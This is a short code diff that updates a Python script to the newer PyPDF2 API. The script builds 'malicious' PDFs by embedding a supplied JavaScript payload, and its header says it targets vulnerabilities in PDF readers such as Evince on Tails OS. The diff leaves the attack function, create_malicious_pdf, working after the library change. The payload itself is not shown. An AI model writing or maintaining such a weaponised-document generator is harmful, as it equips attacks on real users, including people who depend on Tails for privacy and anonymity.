@@ -12,7 +12,7 @@ specific vulnerabilities in PDF readers like Evince which is common on Tails OS.
 
 import os
 import sys
-from PyPDF2 import PdfFileWriter, PdfFileReader
+from PyPDF2 import PdfReader, PdfWriter
 import io
 from reportlab.pdfgen import canvas
 from reportlab.lib.pagesizes import letter
@@ -30,20 +30,20 @@ def create_base_pdf():
     c.save()
     
     packet.seek(0)
-    return PdfFileReader(packet)
+    return PdfReader(packet)
 
 def create_malicious_pdf(output_filename, javascript_payload):
     """Create a PDF with embedded malicious JavaScript"""
     
     # Create a new PDF with Reportlab
     base_pdf = create_base_pdf()
-    output = PdfFileWriter()
+    output = PdfWriter()
     
     # Add the page from base PDF
-    output.addPage(base_pdf.getPage(0))
+    output.add_page(base_pdf.pages[0])
     
     # Add JavaScript action
-    output.addJS(javascript_payload)
+    output.add_js(javascript_payload)
     
     # Write the output PDF
     with open(output_filename, "wb") as output_file:
